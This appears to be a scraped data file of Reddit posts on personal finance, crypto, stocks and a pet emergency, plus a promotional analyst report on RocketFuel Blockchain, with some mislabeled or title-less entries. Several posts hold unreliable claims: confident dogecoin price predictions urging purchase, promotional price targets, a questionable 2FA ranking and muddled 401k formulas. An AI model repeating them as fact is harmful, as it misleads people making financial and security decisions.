financialindependence,Isn't Traditional 401k almost always better than Roth tax-wise?,"EDIT2: **Roth 401k (not Roth IRA) vs. Traditional 401k**

Since both tax savings are commutative, the only thing that matters is the effective tax rate paid at the end.

Let I = pre-tax income, r = annual return, x = years invested

Roth = I \* r\^x \* current\_marginal\_tax\_rate

Traditional = I \* r\^x \* future\_effective\_tax\_rate

So the only time Roth is more advantageous is if your current *marginal* tax rate is lower than your future *effective* tax rate.

Most people won't withdraw more than their annual income from their traditional 401k, so we can assume that *marginal\_tax\_rate &gt;= effective\_tax\_rate*.

The common advice is if you're at the beginning of your career, you're earning lower, so you should put it in a Roth. The Federal marginal tax rate between 40 and 85k  (reasonable starting income range) is 22%. To reach an effective Federal tax rate of 22%, you'd have to earn 227k. Meaning, you would have to expect to withdraw 227k per year from your traditional 401k for Roth to start making sense, a whopping 167% higher than the top income in that bracket.

Against intuition, Roth seems to actually do better when you're in the 85k to 163k bracket. The breakeven point is 270k per year, only 65% higher than the top income in that bracket.

Then, once you're in the 163 to 207k bracket, Roth performs considerably worse. The breakeven point is 800k per year, or 286% of the top income in that bracket.

For the 207 to 518k bracket, the breakeven point is 2MM, or again 286% of the top income in that bracket.

Once you're past 518k, there's never a breakeven point.

Additional assumptions: almost all your income at retirement comes from 401k, since the rest are taxed as long term capital gains. If you have rental income, it could flip towards Roth since traditional withdrawals are now taxed at marginal instead of effective. I also simplified the calculations to only federal taxes since each state is different; some have flat rates, and brackets are different per state.

Caveat: a wrench that could throw off the calculations is future tax increases, which we currently can't predict, but the 65% to 167% buffer is quite high so even moderate tax increases wouldn't put Roth ahead.

personalfinance,"Credit Score of 540, and I need a place to live. Is this insane?","Cons:
I have bad credit, and there is virtually nothing I can do to fix it at the moment or in the near future. Where I live, there are NO rentals ANYWHERE, and I'm about to be homeless in a month.

Pros:
I just got a job that pays $49k per year. I found a foreclosure house in pretty good shape up for sale at $29k. I am eligible for VA loans, but I applied for one at a higher amount and got denied, and I'm afraid to apply again without knowing what I am doing.

Is there any lending company that will approve me for this loan?

About the bad credit: it is from an unexpected $80k education debt owed to the federal government. I tried working with them so I could pay $300/month until my income increased (I was making $23k at the time). They denied it and said I would have to pay $1700 per month or it would go into collections. So it's in collections because that's insane. I can't get it out of collections unless my dog starts pooping gold nuggets, so my credit will be bad forever.

But, with a really cheap house (under $30k), and finally a decent income, I could handle a high interest rate no problemo, and still have a mortgage of like $200, leaving me with extra money to throw at the big debt and try to get my score up so I can refinance later and pay it off early.

I'm sure I'm completely insane, but it almost seems like it isn't a terrible plan given the cards I've got left. Any tips? And while I appreciate people who will tell me to try to increase my score, believe me I've heard it all and I am definitely trying.

CryptoCurrency,Secure Your Accounts Properly!,"After seeing many posts about wallets getting “hacked” (most likely it was their computers or other accounts that were compromised that have weak and/or shared passwords without 2FA) and then seeing posts about SMS 2FA, or people using google Authenticator, I wanted to post this to the community since many of us are big into cryptography and security already and new people are coming in without this knowledge. 

1. It’s very important to be securing all of your devices and accounts properly. That means using a unique password with a long string of different characters for *everything* to **start.** To some that may sound like a hassle, but it really isn’t because you’re going to be using a password manager to help you store your passwords securely with very strong passwords and encryption. And since you’ll have a password manager, you can make the passwords as long and complex as possible without the need to remember them. What should you use for that?

2. Use an offline password manager like Keepass and store the encryption key on a separate offline physical device like a USB stick or a physical security key like Yubikey. This is the best way to secure your passwords as the only way for someone to get a hold of them is to get the key from your physical device that you keep offline. 

3. 2FA everything you can with a physical security key like Yubikey! Per above, you should 2FA every device and account you can and you should *avoid* SMS as that can be easily spoofed by hackers and isn’t secure at all. The next best method of 2FA is using email, but that is really only slightly better. Authenticators like Google Authenticator or LastPass Authenticator is decent, but again can be spoofed by a determined hacker.

Even with all of this, it’s also a good idea to change your passwords every 6 months or so and never, ever use the same password for 2 different things. Also, make sure when you get a security key like Yubikey, you get 2 so that you have a backup and you can link them together. 

With these 3 things, not only will you be in a better spot than 90% of people, but you will have peace of mind, which I can’t express how nice that really is in today’s world.",cryptocurrency

&amp;#x200B;

I will be graduating this May with my degree in Computer Science. I also recently accepted a full-time position from my current internship to start right after I graduate. I am pretty happy with this position as it is in the field I would like to work in and they offer tuition reimbursement as I will be pursuing my masters. They also offer a 100% match up to 5% on my 401k, 3 weeks of paid vacation, a starting salary of $65,000, and a few more benefits I am happy with. I plan on working here a minimum of 4-5 years to complete my masters.

&amp;#x200B;

I was recently informed by my parents that they took out a life insurance policy at my birth. The ownership of this policy was transferred to me when I turned 21. From my understanding, if I cancel the policy I will receive the $30,000 that has been built up over the years. 

&amp;#x200B;

I plan to cancel this policy and use the money for a down payment on a house. I am currently renting a house with a few friends I've known for 9 years where we are splitting the cost between all of us. I pay about $600 a month including utilities. Our lease ends at the start of July and can: A. Be renewed for another year or, B. Go on a month-by-month basis at a higher rate. If I were to purchase a house, we would all move together and they would help pay my mortgage. 

&amp;#x200B;

My question is whether I should sign up for another year, or go ahead and purchase the house as soon as possible. I live in the Orlando area and need to live between my place of work and the university. Houses go for around 230k-300k. I have a credit score of 766, about $7,000 in student debt, and no other debts. I have about 4 months worth of emergency savings, a little bit of money in some stocks, and bitcoin. 

&amp;#x200B;

If I were to purchase in one year, I'd put the money in a high rate saving account for a year and save for the closing costs when I do go ahead and purchase a house. However, with interest rates currently very low I am considering going ahead and purchasing now. This does mean I would probably have less for the actual downpayment. Would this be a smart decision and possibly sign up for the month-by-month basis so I don't have to find a house by a distinct deadline?

In 2020, I lived in Minnesota for two months and in California for the remaining 10 months.

I like to file my taxes for free so I usually use Credit Karma which has been great to me in previous years. Unfortunately, when I put down that I lived in two states, it says I can file my **federal** taxes for free, but won't be able to file state taxes (not even at a premium).

My question is, what options do I have for filing my two state taxes, if I am to file my federal taxes for free with Credit Karma? Am I complicating this too much? Should I just shell $150-200 with TurboTax for the year and next year, when CA is my only state, file again for free? Is there a workaround?

dogecoin,The Coinbase IPO Offering and what it means for doge,"**CAVEAT EMPTOR.**

For those of you that do not already know:

Coinbase is going to be filing for a public IPO Offering within the next 2 weeks. Analysts that study Crypto-Chain stock indicate that Coinbase is expected to have a market Evaluation of roughly $70,000,000,000.00 USD. To put this into perspective, this would make coinbase worth more than companies like:

* Procter &amp; Gamble
* The Walt Disney Corporation
* FedEx
* MetLife Insurance
* PepsiCo

This evaluation puts Coinbase at Expected 47th spot on the Fortune 500 Companies List. Shares for Coinbase are currently expected to be Trading at roughly \~**200.00 USD** Per Share Minimum. Keep in mind, 1 Stock of Microsoft (MSFT) is currently trading as of this post on April 4th, 2021 at **$242.35 USD**. Coinbase has the potential to have stock that is worth more than a large number of Fortune 500 Stocks.

So what does this mean for Dogecoin? Well, as Coinabse offers it's IPO, all Crypto will see a dramatic increase in value. For dogecoin, **THIS WILL** be the time that dogecoin spikes above the **$0.11 USD** Mark, with Dogecoin possibly getting as high as **$0.15 USD**, with an expected new floor of around **$0.125 USD**. Time will show if Dogecoin keeps it's value or if it drops below expected floors. It depends on how perceptive the market is to purchasing the stock offerings from Coinbase. There will be an initial price surge in doge following the IPO release date though, that will definitively see Dogecoin go over **$0.11 USD**.

So how do we get these numbers? Well $0.15 USD is roughly 2.5x, on average, the current price of Dogecoin. Because of the immense value of Coinbase and their IPO, It would be asinine to not assume that doge will at least double it's current market value. Keep in mind that these numbers are EXTREMELY CONSERVATIVE, and doge could possibly spike significantly higher. To be fair, I do not feel that this will be the trigger that gets doge over $1.00 USD, as I am not an expert in calculating futures and want to be generally conservative with floor and ceiling estimates. My associates degree is in software development not financial securities trading.

What will be really telling, is the number of hedge funds that pick up Coinbase as a stock option. If companies like **J.P Morgan-Chase** or **Fidelity Investments** purchase stock options in Coinbase for use in their Investment Hedge Funds, it will greatly normalize the use of Crypto Stock as an investment medium, which in turn , validates crypto currency as an investment medium. We will greatly benefit if major investment firms  start utilizing Coinbase IPO stock offerings for investment purposes.

Long story short, the time is now to buy additional Dogecoin, if possible. Past the IPO launch date, it may become impossible to purchase Doge for less than $0.10 USD.  OF course, only invest what you can and what you think is feasible for you.

What we need to look out for is Pump-And-Dump, or Inverse Ladder Attacks, epecially during the days preceding and the few days after the Coinbase IPO. People or investment firms with substantial standing may attempt to make Dogecoin surge because of it's currently low value. This could take dogecoin sky high, but then make it crash by conducting mass selloffs, then re-buying in with profit. This type of artificial options gaining is unnatural and will  only make dogecoin plummet. The idea here would be to attempt to invalidate Coinbase and it's IPO by making Crypto appear to be much more volatile than it is (That isn't to say that crypto isn't volatile in it's own ways, but this would be considered extremely artificially volatile). There are a lot of investment firms and people with substantial FIAT value that are afraid of decentralized currency and I would honestly not be surprised if something of this nature didn't happen or at least attempt to happen in the future. This would be the absolute worst case scenario, which I honestly don't see happening. If something of this nature were to happen, it would probably be done with a coin that has a moderately high value, like Litecoin or Ripple.

&amp;#x200B;

What are the key pieces of a profile?","Hi, I'm not assuming I can do just as good a job as a financial planner, but I want to educate myself, and become savvy before eventually hiring a financial planner. 

I have a mix of stocks, retirement savings accounts, and mutual funds. But I know there are typically some questions and planning that needs to be mapped out in order for me to become clear about what I need to focus on. This profile I want to create would allow me to make some household financial projections.

For instance, I'm assuming that knowing when I will retire, calculating federal interest rates for the decades to come, as well as return rates on my current investments would give me a start. It would help me see whether I have too much money in mutual funds vs. stocks, and if I have enough money to get me past expected death rate. Does that make sense?

Are there free tools that are excellent quality that I should be using? Anyone else have the same need or experience?",finance
stocks,"Microsoft wins U.S. Army contract for augmented reality headsets, worth up to $21.9 billion over 10 years","The U.S. Army said Wednesday that Microsoft has won a contract to build more than custom HoloLens augmented reality headsets. The contract for over 120,000 headsets could be worth up to $21.88 billion over 10 years, a Microsoft spokesperson told CNBC.

The deal shows Microsoft can generate meaningful revenue from a futuristic product resulting from years of research, beyond core areas such as operating systems and productivity software.

It follows a $480 million contract Microsoft received to give the Army prototypes of the Integrated Visual Augmented System, or IVAS, in 2018. The new deal will involve providing production versions.

The standard-issue HoloLens, which costs $3,500, enables people to see holograms overlaid over their actual environments and interact using hand and voice gestures. An IVAS prototype that a CNBC reporter tried out in 2019 displayed a map and a compass and had thermal imaging to reveal people in the dark. The system could also show the aim for a weapon.

""The IVAS headset, based on HoloLens and augmented by Microsoft Azure cloud services, delivers a platform that will keep soldiers safer and make them more effective,"" Alex Kipman, a technical fellow at Microsoft and the person who introduced the HoloLens in 2015, wrote in a blog post. ""The program delivers enhanced situational awareness, enabling information sharing and decision-making in a variety of scenarios.""

The headset enables soldiers to fight, rehearse and train in one system, the Army said in a statement. The contract, which was awarded on Friday, has a five-year base period, with a five-year option after that, an Army spokesperson told CNBC an email. The Pentagon did not immediately respond to a request for comment.

The deal makes Microsoft a more prominent technology supplier to the U.S. military. In 2019, Microsoft secured a contract to provide cloud services to the Defense Department, beating out Amazon, the leader of the public-cloud market. Amazon has been challenging the contract, which could be worth up to $10 billion, in federal court.

vet,Dog potentially consumed an ant trap—no vets open right now in my area and this may have happened nearly 20 hours ago.,"Hi. Living with my mom and was out all day and didn’t get home until a bit ago (10pm). She discovered chewed up plastic early this morning and didn’t know what it was from and trashed it. She then discovered one of our ant traps was missing a few hours later. She didn’t tell me any of this until just now, six hours after the missing trap discovery. She also didn’t look up anything or call anyone or even check for an open vet and so she decided she’d just keep an eye on the dog for symptoms. Everything in my soul immediately screams that that was an awful idea and I’m pretty worried (even though her being fine after this long is a decent sign).

No vets open in my area. I fed her a few small pieces of bread hoping to help even a bit but that obviously would’ve been more useful hours ago. Anything I can do right now? I’m planning on staying up for a while to monitor her. She’s a big dog, lab mix around 60 lbs., and the traps are fairly small. But there’s of course a possibility of plastic ingestion, not just the poison.

Should I still be contacting emergency services despite the small dose and the timeframe? Thanks for any advice.",cryptocurrency
personalfinance,Cash Balance Pension or Defined Contribution Plan,"Hey everyone. I need some help choosing my retirement plan. I've been given a one time irrevocable decision to choose a retirement plan. I realize I will have to make the choice myself, but I'm unable to weigh the benefits/risks entirely. 

The first is a cash balance pension formula. They will match 4% of my annual salary into a pension plan. The plan will go at a rate equal to the 30 year US Treasury interest rate. Each quarter interest is applied at a minimum of .75% and a maximum of 2.25%. So annually that equates to 3-9%. My company pays all the administrative fees. I wouldn't have to do anything to that account and it'll grow at those interest rates, risk free. 

The other option is the defined contribution plan where I choose where to invest in funds. Similar to the defined benefit, the company will contribute 4% of my salary to the plan. I pay the investment management fees. The risk is greater as well as the reward. 

Some things to note: I'm 28. I can see myself being with this company for a long time. The vesting time is 3 years. I'm part of a union. The company offers a 401k separately from the pension plan. I already have an individual investment account set up which is doing about 5-10% ROI. I just want to know where it's smart to pick the cash balance pension or defined contribution. Thanks!",finance
Banking,Primary Address vs. Address on License?,"I'm thinking about opening a new bank account with a different Credit Union than the one I currently have. Doing this because I have helicopter parents who monitor everything I buy and I'm tired of having to justify myself when using my own credit cards and money. So, opening a new account elsewhere will get me away from this till I'm no longer on the payroll. 

I was looking at Navy Federal Credit Union and going through the process and it asked me to list a primary address (which I would be putting my school apartment address since I'm in college). It also asked for my license number and the address that is on my license (which is my home address). My question is, if anything were to come in the mail from Navy Fed, would it go to my primary address (at school) or would it go to the address the is listed on my license? I want to think it'll just go to my primary address, but there's that sliver of doubt in my mind that'll it'll go to my home address and that will result in a very unfortunate and long discussion with the parents that I don't want.

CryptoCurrency,Why would inflation be a problem when central banks can control interest rates and governments control taxation?,"This is relevant to crypto because one of the core purposes of it (at least bitcoin) is to hedge against inflation of fiat currencies. Therefor, I assume many here think there will be inflation in the US soon due to high spending. 

They’ll of course be 2% inflation at least, but why would people think inflation will run away when the fed can raise rates at any point? Haven’t we avoided large inflation for decades now? Why would a certain amount of US debt mean our whole system has to collapse? 

Does someone expecting inflation not believe in Modern Monetary Policy? Do you think the central bank system we have now will epically collapse at some point?

personalfinance,Wanting to move out into an apartment. How do I start the process? What should I know when searching and signing lease? What should be the budget for my apartment?,"I am 28F still living at home with my mom and siblings. My mom has always encouraged me to save my money, which I have. I have about $60k saved up. I initially wanted a house but I feel like I’d have to live another 1-2 years here to save up.

My mom is very toxic, unsupportive, degrading, passive-aggressive, etc. If I ask her for help about apartments, she shoots down my idea and tells me to get a house. I asked her how should I look into homes (interest rates, mortgage, etc.) and she shoots it down. Tells me I need to do this, and that. 

I am extremely desperate to move out and have been looking into apartments. I have had this job for almost 2 years now and it pays well IMO. I may have to pick up extra shifts for more money to go into savings, apartment/house, another car, etc. I don’t know what my budget should be but I will give a quick breakdown:

Rent: $0

Utilities: $0

Food: $100/mo maybe less

Gas: $30 every 2 weeks or so (I don’t drive much since my mom and I share the to take help take turns taking my grandparents to their appointments)

Car insurance: $0 

Savings: $60k

Fun money: $350. Every time I get my paycheck, I move money over and only leave $200-$350 in my checking is account. That way I’m not over spending. I usually don’t spend all of it since I don’t do much besides work and occasionally go on dates with my bf.

Unsure what else to list. Hopefully this helps. What should my budget be when searching for an apartment? What exactly should I be looking for? How can I narrow it down to my wants and needs vs what can get me by? I’m so lost and I don’t want to just up and sign something.

Also, do they report to the credit bureau? My credit score is good (730-750) and I made all my payments on time (had a Care credit card for a pet ER bill, just paid it off days ago).

stocks,Best stocks for Biden's infrastructure plan,"This is great article from Seeking Alpha but since it's against the rules to link SA articles here I'll just copy/paste.

##**Engineering &amp; Construction.** 
Analyst Sean Eastman says ""the reinforced focus on infrastructure stimulus and on climate resilience will be powerful multiyear themes.""

1. **AECOM** (NYSE:ACM) can expect a tailwind to its all-organic-growth strategy and ""transportation, environment, and water design/engineering"" represents 65% of revenue.
2. **Quanta Services** (NYSE:PWR) is ""a major enabler of the electrification of the economy, the interconnection of renewable power generation, and the modernization of the electric grid.""
3. **Dycom Industries** (NYSE:DY) is essentially a pureplay on telecom infrastructure specialty contracting and ""should be a beneficiary of rural broadband build-outs.""

##**Machinery &amp; Equipment Rental.** 
Analysts Steve Barger and Ken Newman see ""particular upside potential for our construction machinery OEMs, equipment rental companies, and rail transportation manufacturers.""

1. **Oshkosh** (NYSE:OSK) and **Terex** (NYSE:TEX) are picks with a view that ""new and/or replacement buildings and infrastructure would drive increased utilization for AWPs, telehandlers and scissor lifts, cement mixers, crushing and screening equipment, and potentially fire and emergency trucks.""
2. **Federal Signal** (NYSE:FSS) will benefit from spending on replacement lead pipes and building affordable housing.
3. **Wabtec** (NYSE:WAB) should see business from modernizing public transit and investment in passenger and freight rail.
4. **United Rentals** (NYSE:URI) will get a broad boost from infrastructure spending because of the ""fungibility"" of its fleet.

##**Metals.** 
Analyst Phil Gibbs says the spending program will offer a demand catalyst in the ""intermediate term,"" but the size of the package will likely be closer to $500B to $1T.

1. Along with the broader group, direct beneficiaries with ties the infrastructure or earth-moving equipment will be, in order: **Commercial Metals** (NYSE:CMC), **Nucor** (NYSE:NUE), **Reliance Steel and Aluminum** (NYSE:RS), **Steel Dynamics** (NASDAQ:STLD), **Olympic Steel** (NASDAQ:ZEUS) and **Schnitzer Steel** (NASDAQ:SCHN).

##**Diversified Industrial.** 
Analyst Jeff Hammond thinks the entire group would benefit for fundamental and sentiment reasons.

1. **Colfax** (NYSE:CFX), from welding, **Harsco** (NYSE:HSC), **Eaton** (NYSE:ETN) and **nVent Electric** (NYSE:NVT), both for EV chargers, **Helios Tech** (NASDAQ:HLIO), **Gates Industrial** (NYSE:GTES) should benefit in transportation.
2. **Parker-Hannifin** (NYSE:PH), **ETN**, **NVT**, **Nordson** (NASDAQ:NDSN), **Altra Industrial Motion** (NASDAQ:AIMC), **Rexnord** (NYSE:RXN), **Regal Beloit** (NYSE:RBC), **CFX**, **Enerpac Tool Group** (NYSE:EPAC) will benefit in manufacturing.

4. **CARR, LII, TT, WSO,** for ventilation upgrades, will benefit in schools spending.
5. **CARR, LII, TT** should benefit from federal building upgrades.
6. **ETN, Generac Holdings** (NYSE:GNRC) should benefit from alternative energy.

##**Auto Suppliers.** 
Analyst James Picariello says the plan is well targeted for the blueprints for mass EV adoption, which are ""strict and consistent emissions regulations, generous consumer tax incentives, and a determinable charging infrastructure buildout.""

1. **Aptiv** (NYSE:APTV) and **BorgWarner** (NYSE:BWA) lead EV supplier opportunities, followed by **Dana** (NYSE:DAN), **Meritor** (NYSE:MTOR), **Magna International** (NYSE:MGA) and **Lear** (NYSE:LEA), but the latter two would be disproportionately hit by higher corporate tax rates.
2. **MTOR** and **DAN** will also benefit from the impact on truck and off-highway markets.

##**Vertical Software.** 
Analyst Jason Celino thinks the plan would ""accelerate digitization opportunities across the architecture and construction industry.""

1. **Bentley Systems** (NASDAQ:BSY) gets 60% of total revenue from infrastructure, so the plan could lead to ""meaningful multiyear tailwinds.""
2. **Autodesk** (NASDAQ:ADSK) exposure to infrastructure of 15-20% of revenue and the ""completion of its Innoyze acquisition, providing solutions for water infrastructure assets, gives us incremental confidence.""
3. **Trimble** (NASDAQ:TRMB) has 25-30% of revenue from infrastructure ""geospatial, construction, and civil engineering offerings are well positioned.""

##**Chemicals.** 
Analyst Aleksey Yefremov highlights benefits for ""industrial coatings, polyurethanes, epoxy, PVC, and chlor-alkali.""

1. **Huntsman** (NYSE:HUN) will see higher end-market demand, with the most upside in polyurethanes.
2. **Olin** (NYSE:OLN) is a pick as the ""proposed spending package laid out plans for manufacturing spend, a key end market for caustic soda. Industrial coatings and adhesives is also a major end market for the Epoxy segment.""
3. **Westlake Chemical** (NYSE:WLK) is ""a beneficiary of strong PVC, building products (mostly pipe), and chlor-alkali markets.""
4. **DuPont** (NYSE:DD) has the most compatible portfolio for the spending bill.
5. **Albemarle** (NYSE:ALB), **Livent** (NYSE:LTHM) should benefit from a pickup in EV support.

##**Communication Services.** 
Analyst Brandon Nispel says the bill ""is positive for infrastructure providers (tower operators) and neutral to negative for network providers (wireless carriers and cable operators).""

1. **American Tower** (NYSE:AMT), **Crown Castle** (NYSE:CCI), **SBA Communications** (NASDAQ:SBAC) are picks in towers, which will be helped by improving investment in wireless networks.
2. **Altice USA** (NYSE:ATUS), **Cable One** (NYSE:CABO), **Charter Communications** (NASDAQ:CHTR), **Comcast** (NASDAQ:CMCSA), **WildOpenWest** (NYSE:WOW) may see a hit to discretionary cash flow due to a higher corporate tax rate.
3. **AT&amp;T** (NYSE:T), **T-Mobile U.S.** (NASDAQ:TMUS) and **Verizon** (NYSE:VZ) are the most at risk of a corporate tax rate hike, with T and VZ seeing incremental taxes of $1.5B to $2B.

##**Entertainment and Video Games.** 
Analyst Tyler Parker says the plan for bringing high-speed broadband to every American will help domestic online vide games

1. **Activision** (NASDAQ:ATVI), **Electronic Arts** (NASDAQ:EA), **Take-Two Interactive** (NASDAQ:TTWO) and **Ubisoft** (UBISFY) could see tailwinds.

##**Semiconductors.** 
Analysts John Vinh and Wes Twigg say ""expansion incentives would likely be a tailwind for semiconductor equipment demand while easing the capex burden on manufacturers.""

1. **Applied Materials** (NASDAQ:AMAT), **ASML** (NASDAQ:ASML), **Advanced Energy Industries** (NASDAQ:AEIS), KLA (NASDAQ:KLAC), **Lam Research** (NASDAQ:LRCX) and **Teradyne** (NASDAQ:TER) would benefit in equipment names.
2. **Analog Devices** (NASDAQ:ADI), **Intel** (NASDAQ:INTC), **Micron** (NASDAQ:MU), **ON Semiconductor** (NASDAQ:ON) and **Texas Instruments** (NASDAQ:TXN) are picks among those with domestic manufacturing footprints.

##**Utilities.** 
Analyst Sophie Karp notes the majority of the impact on the sector would not come from direct spending, but from fiscal incentives.

1. **American Electric Power** (NASDAQ:AEP), **Southern** (NYSE:SO), **Duke Energy** (NYSE:DUK), **Dominion Energy** (NYSE:D), **Entergy** (NYSE:ETR) and **Edison International** (NYSE:EIX) can benefit from incremental grid investment initiatives and electrifications trends from an EV tide that will ""lift all boats.""
2. **Eversource Energy** (NYSE:ES), **Avangrid** (NYSE:AGR), **Public Service Enterprise Group** (NYSE:PEG), **NextEra Energy** (NYSE:NEE), **Xcel Energy** (NASDAQ:XEL), **AEP**, **Sunrun** (NASDAQ:RUN), **Sunova Energy** (NYSE:NOVA) will be helped by the extension of the investment tax credit and the production tax credit further boosting commercial solar and wind.
3. **Public Service Enterprise Group** (PEG), **Excelon** (NASDAQ:EXC) and **Energy Harbor** (OTCPK:ENGH) would benefit from any concrete federal program to support nuclear energy.
4. **First Solar** (NASDAQ:FSLR) may get a boost if solar installers can bypass Chinese tariffs.

##**Oil and Gas Exploration and Production.** 
Analyst Leo Mariani says the plan ""is likely to have a bit of a long-term negative for traditional U.S. oil E&amp;Ps if it accelerates the transition away from fossil fuels for transportation purposes, but we generally think that other variables that normally impact the price of oil over the next few years are much more likely to affect energy stocks as opposed to the impacts of this bill, which will take a healthy part of this decade and into the next to make a material impact.""

##**Life Science Tools.** 
Analyst Paul Knight says ""a specific call-out of 'biotechnology' as a key technology investment is positive.""",finance

**The market is huge and growing at an enviable rate.** According to Markets and Markets, the blockchain technology market is expected to reach the $39.7B mark in 2025, up from $3B in 2020. 

**Current eCommerce methods are outdated, problematic, and costly, while the Company’s platform is designed to improve the merchant and customer experience.** Implementation should lead to lower merchant costs, potential recurring business and may foster customer loyalty.

***The View from 30,000 Feet*** 

Blockchain payments innovator **RocketFuel** **Blockchain, Inc. (OTCQB – RKFL)** is poised to transform the global eCommerce industry, in our view. The Company is an early mover as a global provider of one-click online payment options using Bitcoin and dozens of other cryptocurrencies. Moreover, RocketFuel is the first cryptocurrency payment service to provide a seamless and elegant one-click checkout experience that today's digital and mobile-centric consumers have come to expect from eCommerce marketplaces, such as **Amazon (NASDAQ – AMZN)**.  

The RocketFuel platform, based on patent-pending technology, enables merchants and consumers to easily complete payment for goods and services using 43 different cryptocurrencies or direct bank transfer in a completely secure environment. A significant benefit of the Company’s approach is that the entire shopping cart checkout process can be executed via a distributed ledger or blockchain. Thus, merchant websites will no longer required to operate complex, and costly payment and check-out infrastructures. With the one-click checkout used on RocketFuel-partnered sites, consumers will enjoy unrivalled convenience . 

As is typically the case with new technologies and applications with a broad scope, we expect early adopters to dominate usage during 2021 as online merchants shopping cart and payment solutions providers implement the crypto acceptance functionality, with mass market utilization occurring in 2022. With estimates suggesting that the number of (non-Facebook) crypto wallet holders will grow to 250M+ in the next 2-3 years, up from 68M today, substantial adoption lies ahead.    

***The Problem*** 

eCommerce has enjoyed wide, mainstream adoption and in many cases has emerged as the shopping method of choice for consumers during the COVID-19 pandemic. Unfortunately, for merchants and consumers alike, many of the payment system setups and associated technologies in place today have underlying issues, which in turn have a deleterious effect on merchant/consumer transaction execution. 

For consumers, payment systems and shopping cart utilization can be awkward and clunky, require multiple steps and redirects to 3rd parties, and may not be secure, resulting in a less than stellar customer experience. For merchants, the current eCommerce payment infrastructure is even more problematic. In most cases, merchants are required to use an intermediary, costing billions in excess expenses annually. Roughly 1 in 5 carts leave without completing a transaction because consumers do not trust the merchant’s system. Plus, in most cases, fees are high, payments are delayed, and exorbitant fees due to fraud, fraud prevention, and chargebacks related to the inefficient back-end operations can be excessive, reducing profits. 

***The Solution***  

In contrast, by leveraging modern blockchain technology and its proprietary platform, RocketFuel offers consumers a single-click pay solution, pay with crypto or direct bank transfer option with no redirects or filling out forms as the information is stored at once. The process is seamless-simple, efficient, secure, and convenient. Merchants generate higher shopping cart conversion, pay lower fees, have greater security, transparency, less fraud, and improved cash flow. With a better experience for both sides of the transaction, and improved order and shipping fulfillment, merchants can foster loyalty and generate recurring business.  

***Today and Tomorrow*** 

The Company launched its first product in a live environment in March 2021 and with two travel merchant customers and a tax auditing firm in hand, management intends to continue to develop the check-out technology with several larger U.S. eCommerce merchants, social media and blogsites. With connections to several larger eCommerce merchants, near term sales and marketing efforts will focus on a few “big fish” rather than many smaller merchants and will scale up initiatives as funding permits. We believe that the Company will also target specific verticals that may be a source of early adopters and crypto wallet holders in verticals such as online gambling, gaming, and with merchants selling high ticket items. In conjunction with this targeted approach, RocketFuel may utilize social media to generate awareness and attract consumer influencers. Given that the phase from early adoption to mass market adoption can take 12-18 months, we believe that the Company could enjoy exponential merchant sign-ups going forward, along with consumer utilization, from 2021-2022, with the greatest recurring platform utilization by consumers beginning in 2023.  

***Financial Forecasts and Valuation*** 

It is difficult to accurately project the deployment and adoption success of a new technology and application such as the unique RocketFuel blockchain and crypto payment service.  However, given the underlying growth rates in blockchain ledger utilization for financial and payment transactions, as well as the proliferation of crypto wallet adoption, it is clear that major upside exists. Widespread adoption and growth are further affirmed by the Company’s underlying offering which solves major unmet needs in eCommerce for merchants and consumers alike. As with many young companies, it comes down to efficient execution. The management has a strong, proven track record of developing new technologies, bringing them to market, and generating value for the investors. The CEO has exited 5 other companies. 

We should note that our forecasts largely reflect the typical growth inherent in new technology firms from early mover/early adopter stage to mass market appeal. Plus, the speed with which adoption in the online world occurs tends to be faster than most historical segments, further bolstering our investment thesis and projected growth rates. The variables in our forecasts tend to be the average fee percentage charged to merchants as well as revenue derived via license. It is too early in the maturation cycle to firmly estimate such revenue breakdowns or figures. 

To simplify and streamline our initial forecasts, we have estimated $100M in business transacted at an average fee of 1.8% for Year 1 (Apr 2021-Mar 2022), reduced to 1.5% on $800M in transactions in FY23E and $2.5B in transactions for FY24E. While we believe additional revenue streams could be booked in FY23E, we view such contribution as a bonus at this time. However, we do project $2.5M in licensing revenue and other fees in FY24E. Based on this model, we project revenue of $1.8M in FY22E with a loss of $2.45M, or ($0.09) and revenue of $12M in FY23E with net profit of $650K, or $0.02. We preliminarily project $40M in revenue ($37.5M in transaction fees and $2.5M in licensing fees) for FY24E with net of $7.3M, or $0.22, and a net margin of 18.3%. 

Given the game-changing technology and its resultant impact on the use of cryptocurrencies along with ecommerce efficiency and volume, we believe that RKFL could be afforded premium valuations as adoption occurs. Going forward, we recommend investors value the Company based on milestone events such as merchant signup as we view 2021 as a key infrastructure, proof-of-concept year, with major revenue growth in the cards in 2022 (fiscal 2023). Our 6-12-month target of $6.15 reflects a reasonable 4x our FY24 (CY23) sales estimate of $40M and roughly 28x our $0.22 EPS forecast. This target could prove to be conservative if adoption accelerates later this year or in early 2022. 

Finally, we believe that as a critical mass adoption among merchant occurs, the Company could emerge as a takeover candidate by a leading payment services or provider entity. RocketFuel’s leadership has an enviable history of building and selling technology start-ups at key inflection points. While this event may not occur, it may have an occasional impact on valuation and should provide further confidence in management’s capabilities. 

**INDUSTRY PRIMER: BLOCKCHAIN** 

📷 

According to a recent report by Markets and Markets, the blockchain technology market is expected to reach the $39.7B mark in 2025, up from $3B in 2020. 

A blockchain, also known as a “distributed ledger technology,” is a sequential, ever-growing, time-stamped set of records used to secure transactions across multiple devices that are grouped in blocks and maintained by disparate participants. Each block is interdependent, making alterations of records economically difficult if not outright impossible. 

Transactions in money, equities, bonds, titles, deeds, contracts, and virtually all other kinds of assets can be implemented and stored securely, privately, and from peer to peer, because trust is established by network consensus, cryptography, collaboration, and sophisticated code---without intermediaries. Given the opportunities associated with such a disruptive technology, many firms in varied industries are actively operating in the space to transact business, agreements and financial transactions more efficiently. 

Commercial and central banks across the world are now using blockchain technology for payment processing and issuing of their digital currencies. The technology enables cross-border payments that are less expensive and faster as compared to traditional systems. The remittance cost within the blockchain is 2% to 3% of the total amount as compared to other third parties as blockchain does not require third-party authentication. Even governments are introducing CBDCs (Central Bank Digital Currency) to replace cash and traditional fiat-currencies. Plus, they are putting social media behemoths such as Facebook and Google under scrutiny for their lack of privacy protection and data security. 

One of the most popular applications of blockchain is cryptocurrency. Trading in cryptocurrency is relatively easy compared to other assets. You can begin trading just by signing up for various wallets on the market. Furthermore, there are different types of wallet apps, each with its own advantages, such as levels of security, accessibility, and more. The most popular and well-known wallet is Coinbase with 639,885 daily active users (DAUs). If Facebook’s Libra initiative to its 2B users is successful, this figure will be dwarfed in short order. 

